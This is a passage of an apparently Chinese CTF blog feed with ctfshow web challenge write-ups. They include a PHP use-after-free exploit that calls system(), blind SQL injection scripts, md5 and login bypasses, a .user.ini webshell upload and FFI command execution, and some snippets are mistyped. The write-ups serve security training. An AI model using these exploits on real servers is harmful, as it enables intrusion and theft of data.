die(\"Couldn't determine binary base address\");\n    }\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i &lt; 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n    ($helper-&gt;b)($cmd);\n    exit();\n}\nexit();\n</code></pre>\n<h2 id=\"web-75\"><a href=\"#web-75\" class=\"headerlink\" title=\"web 75\"></a>web 75</h2><p>先通过glob读取文件目录</p>\n<p>用数据库pdo读取</p>\n<pre><code class=\"php\">try {\n        $dbh = new  PDO('mysql : host=localhost ; dbname=ctftraining', ' root', ' root');\n        foreach ($dbh-&gt;query('select- load_ file(\"/flag36.txt\") ') as  $row) {\n            echo ($row[0]) . \"I\";\n        }\n        $dbh = null;\n    } catch (PDOException $e) {\n        echo $e-&gt;getMessage();\n        exit(0);\n    }\n    exit(0);\n</code></pre>\n<h2 id=\"web-77\"><a href=\"#web-77\" class=\"headerlink\" title=\"web 77\"></a>web 77</h2><p>盲测特性</p>\n<pre><code class=\"php\">c=$ffi = FFl:cdef(\"int system(const char *command);\");\n$a='/readflag&gt; 1.txt';\nff-&gt;system($a);\n</code></pre>\n<h2 id=\"web-118\"><a href=\"#web-118\" class=\"headerlink\" title=\"web 118\"></a>web 118</h2><p><code>${PATH:~A}${PWD:~A}$IFS????.???</code></p>\n<p>nl 命令</p>\n<h2 id=\"web-119\"><a href=\"#web-119\" class=\"headerlink\" title=\"web 119\"></a>web 119</h2>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/96bab31d/",
            "url": "http://dpm12345.cn/posts/96bab31d/",
            "title": "other",
            "date_published": "2022-10-04T03:43:10.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h1>\n<h2 id=\"web-4\"><a class=\"anchor\" href=\"#web-4\">#</a> web 4</h2>\n<p>日志文件   蚁剑</p>\n<h2 id=\"web-5\"><a class=\"anchor\" href=\"#web-5\">#</a> web 5</h2>\n<p><strong>开头 0e 的 md5</strong></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>QNKCDZO：0e830400451993494058024219903391 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>240610708：0e462097431906509019562988736854 </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s878926199a 0e545993274517709034328855841020 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s155964671a 0e342768416822451524974117254469 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s214587387a 0e848240448830537924465865611904 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s1091221200a 0e940624217856561557816327384675 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s1885207154a 0e509367213418206700842008763514 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s1502113478a 0e861580163291561247404381396064 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>s1836677006a 0e481036490867661113260034900752 </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>s1184209335a 0e072485820392773389523109082030 </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>s1665632922a 0e731198061491163073197128363787 </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>s532378020a 0e220463095855511507588041205815</pre></td></tr></tbody></table></figure><h2 id=\"web-6\"><a class=\"anchor\" href=\"#web-6\">#</a> web 6</h2>\n<p>输入万能密码，显示 <code>sql injection error</code></p>\n<p>猜测空格过滤，绕过，发现能正常回显，之后便是正常爆库、表、字段了</p>\n<h2 id=\"web-7\"><a class=\"anchor\" href=\"#web-7\">#</a> web 7</h2>\n<p>同样的也是空格过滤</p>\n<p>在输入时同时也发现对单引号  <code>'</code>  的滤</p>\n<h2 id=\"web-8\"><a class=\"anchor\" href=\"#web-8\">#</a> web 8</h2>\n<p>首先确认该题为数字型注入 同样也是过滤了空格，之后可发现过滤了逗号，那么联合查询不能使用了，可以采用布尔盲注 下面是逗号的绕过方法</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>' and ascii (substr ((select database ()),1,1))=xx #</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>' and ascii (substr ((select database ()) from 1 for 1))=xx #</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>这应该是 substring 函数的两种用法</pre></td></tr></tbody></table></figure><p>使用如下程序爆库</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>s <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>table <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://41ca0d79-9b41-4a09-b5e6-a5d1fe2a3a03.challenge.ctf.show/index.php'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#估计查询到的字段长度</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#从可读取的 ascii 码开始到结束</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\"># 爆表名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">#爆字段名 flag</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#payload = \"ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#\"%(str(i),str(j))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#读取 flag</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = \"ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#\"%(str(i), str(j))</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        re <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> <span class=\"token string\">'?id=0/**/or/**/'</span> <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'I asked nothing'</span> <span class=\"token keyword\">in</span> re<span class=\"token punctuation\">:</span>  <span class=\"token comment\">#是否成功   </span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            table <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></tbody></table></figure><p>得到 flag</p>\n<h2 id=\"web-9\"><a class=\"anchor\" href=\"#web-9\">#</a> web 9</h2>\n<p>访问  <code>/robots.txt</code>  可以知道源码文件</p>\n<p>下载得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"password error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select * from user where username ='admin' and password ='\"</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t\t\t\t <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"登陆成功&lt;br&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\t\t\t <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t\t <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p><code>$sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\";</code></p>\n<p>其中</p>\n<p><img data-src=\"../../../post_images/%E5%9B%BE%E7%89%87/3544233-69332a9de6e8291b.png\" alt=\"\"></p>\n<p>由此如果想要绕过，那么应该使得 <code>password</code>  转换成 16 进制的 hex 值以后，再将其转换成字符串后包含 <code>' 'or ' 6'&lt;trash&gt;</code></p>\n<p>有一个字符串为  <code>ffifdyop</code> , 经过上述操作满足该条件</p>\n<p>构成 <code>SELECT * FROM admin WHERE pass=' 'or ' 6'&lt;trash&gt;</code></p>\n<p>就可以注入了</p>\n<h2 id=\"web-10\"><a class=\"anchor\" href=\"#web-10\">#</a> web 10</h2>\n<p>这里介绍两个 mysql 语句</p>\n<ol>\n<li>\n<p>group by（将结果集中的数据行根据选择列的值进行逻辑分组） 不加 group by 时的输出如下</p>\n<p><img data-src=\"../../../post_images/%E5%9B%BE%E7%89%87/20200217171754632.png\" alt=\"\"></p>\n<p>在使用 group by 以后会按照 password 中的值进行排列</p>\n</li>\n<li>\n<p>with rollup（group by 后可以跟 with rollup，表示在进行分组统计的基础上再次进行汇总统计） 来看实例</p>\n<p><img data-src=\"../../../post_images/%E5%9B%BE%E7%89%87/20200217171715827.png\" alt=\"\"></p>\n<p>结果中将会多出一行，其中 <code>password</code>  列为 null， <code>count（*)</code>  为统计和。</p>\n</li>\n</ol>\n<p>这里我们就可以通过骚姿势绕过了。</p>\n<p>其中  <code>/**/</code>  是为了绕过空格过滤</p>\n<p><code>payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></p>\n<p>因为加入 with rollup 后 password 有一行为 NULL，我们只要输入空密码使得 <code>(NULL==NULL)</code>  即可满足 <code>$password==$row['password']</code>  的限制成功登陆</p>\n<p>登录成功即可显示 flag</p>\n<h2 id=\"web-11\"><a class=\"anchor\" href=\"#web-11\">#</a> web 11</h2>\n<p>看代码</p>\n<p>要使 password=$_SESSION ['password']</p>\n<p>而 session 在 cookie 里，根据提示，那么删掉 cookie 后提交空密码即可</p>\n<h2 id=\"web-12\"><a class=\"anchor\" href=\"#web-12\">#</a> web 12</h2>\n<p>查看源码，有注释 <code>hit:?cmd=</code> ，题目 hint 为 glob 绕过</p>\n<p>查找相关函数后，payload： <code>?cmd=print_r(glob(\"*.php\"));</code>  或 <code>print_r(scandir(\".\"));</code></p>\n<p>得到一个 php 文件名，再使用提示的 highlight 查看源码</p>\n<p>得到 flag</p>\n<h2 id=\"web-13\"><a class=\"anchor\" href=\"#web-13\">#</a> web 13</h2>\n<p>文件上传</p>\n<p>访问  <code>upload.php.bak </code> 下载源码</p>\n<p>知道做了很多限制，php 不能上传，文件内容不超过 24, 文件名小于 9，文件后缀不大于 3</p>\n<p>这里用到了上传 <code>.user.ini</code>  绕过黑名单</p>\n<p><strong>原理：</strong>  <code>PHP_INI_PREDIR</code>  模式的配置也可以在 <code>.user.ini</code>  文件中进行配置</p>\n<p>在 <code>PHP_INI_PERDIR</code>  模式中存在两个特殊的配置： <code>auto_append_file</code> 、 <code>auto_prepend_file</code> 。</p>\n<p><code>auto_prepend_file</code>  配置的作用为指定一个文件在主文件解析前解析， <code>auto_append_file</code>  的作用为指定一个文件在主文件解析后解析 因此可上传一个 <code>1.txt</code> ，内容为一句话木马 然后再上传包 <code>auto_prepend_file=1.txt</code>  的 <code>user.ini</code>  文件</p>\n<p>之后 payload： <code>http://14b1f783-83bc-4d8d-88dd-2c51ed6f4d05.challenge.ctf.show/?a=print_r(glob('*'));</code></p>\n<p>访问目录得到所有文件名，得到一个 php 文件名</p>\n<p>用 <code>highlight</code>  访问得到 flag</p>\n<h2 id=\"web-14\"><a class=\"anchor\" href=\"#web-14\">#</a> web 14</h2>\n<p>首先是一个 <code>switch</code>  语句</p>\n<p>观察代码，明显是要输出 url 的内容，那么必然要进入带有双引号的语句</p>\n<p>根据 <code>switch</code>  语句的特性，可以输入 <code>c=3</code> , 输出 url</p>\n<p>访问得到的路径，发现是一个数据库查询页面，回显为 <code>alert</code></p>\n<p>尝试 <code>1</code> ，返回 <code>admin，2</code> ，返回另一个，输入 <code>1 or 1=1</code> ，无反应，改为 <code>1/**/or/**/1=1</code> ，正常回显</p>\n<p>于是清楚注入方式和空格过滤</p>\n<p>查看源码也可知 <code>information_schema.tables</code>  和 <code>information_schema.columns</code>  被过滤 这里采用反引号过滤即 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><msub><mi>n</mi><mi>s</mi></msub><mi>c</mi><mi>h</mi><mi>e</mi><mi>m</mi><mi>a</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">‘</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant=\"normal\">‘</mi></mrow><annotation encoding=\"application/x-tex\">information_schema.`tables`</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">s</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord\">.</span><span class=\"mord\">‘</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">‘</span></span></span></span></p>\n<p>之后爆出库名，表名，字段 最后查询字段值时，返回 <code>1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...</code></p>\n<p>也就是说 flag 可能在 <code>secret.php</code>  文件中 使用 MySQL 的 <code>load_file</code>  进行查询 访问默认目录 <code>/var/www/html/</code></p>\n<p><code>?query=0/**/union/**/select/**/load_file('/var/www/html/secret.php') </code></p>\n<p>查询后无回显，但查看源码，看到 alert 里面</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$url = 'here_1s_your_f1ag.php';</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$file = '/tmp/gtf1y';</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>if(trim(@file_get_contents($file)) === 'ctf.show'){</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\techo file_get_contents('/real_flag_is_here');</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>}'</pre></td></tr></tbody></table></figure><p>也就是说 flag 可能在 <code>/real_flag_is_here</code>  里</p>\n<p>访问 <code>?query=0/**/union/**/select/**/load_file('/real_flag_is_here')</code></p>\n<p>无回显，但查看源码，同样在 alert 里，得到 flag</p>\n<h2 id=\"红包题第七弹\"><a class=\"anchor\" href=\"#红包题第七弹\">#</a> 红包题第七弹</h2>\n<p>页面显示 phpinfo () 的回显</p>\n<p>不知道咋做，网上搜索</p>\n<p>首先 wegt 下载 index，发现有后面文件，但无法访问</p>\n<p>shell 为 Letmein，使用蚁剑连接</p>\n<p>发现 flag.txt, 但点进去后没有内容，但 flag 是占用空间的</p>\n<p>那么回到网页，POST 传入 <code>Letmein=highlight_file ('/var/www/flag.txt');</code></p>\n<h2 id=\"ctfshow-web1\"><a class=\"anchor\" href=\"#ctfshow-web1\">#</a> CTFshow web1</h2>\n<p>爆破</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://e9258400-1724-487b-b58e-e28eab62e8cc.challenge.ctf.show/\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url1<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/reg.php\"</span> <span class=\"token comment\">#注册页面</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url2<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/login.php\"</span><span class=\"token comment\">#登录界面</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url3<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span><span class=\"token string\">\"/user_main.php?order=pwd\"</span> <span class=\"token comment\">#查询界面</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>k<span class=\"token operator\">=</span><span class=\"token string\">\"ctfshow{\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token string\">\"-.0123456789:abcdefghijklmnopqrstuvwxyz{|}~\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        l<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        l<span class=\"token operator\">=</span>k<span class=\"token operator\">+</span>i</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        l2 <span class=\"token operator\">=</span> k<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>l<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                    <span class=\"token string\">'email'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    <span class=\"token string\">'nickname'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>l</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        data2<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>l<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                      <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>l</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>l<span class=\"token operator\">==</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            k<span class=\"token operator\">=</span><span class=\"token string\">'flag'</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        r1 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        r2 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        r3 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        t <span class=\"token operator\">=</span> r3<span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;td&gt;\"</span><span class=\"token operator\">+</span>l<span class=\"token operator\">+</span><span class=\"token string\">\"&lt;/td&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>t<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;td&gt;flag@ctf.show&lt;/td&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            k<span class=\"token operator\">=</span>l2</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></tbody></table></figure><h2 id=\"红包题第二弹\"><a class=\"anchor\" href=\"#红包题第二弹\">#</a> 红包题第二弹</h2>\n<p>查看源码，获得注释 <code>?cmd</code> ，修改网址，得到代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#error_reporting(0);</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh-CN<span class=\"token punctuation\">\"</span></span><span class=\"token 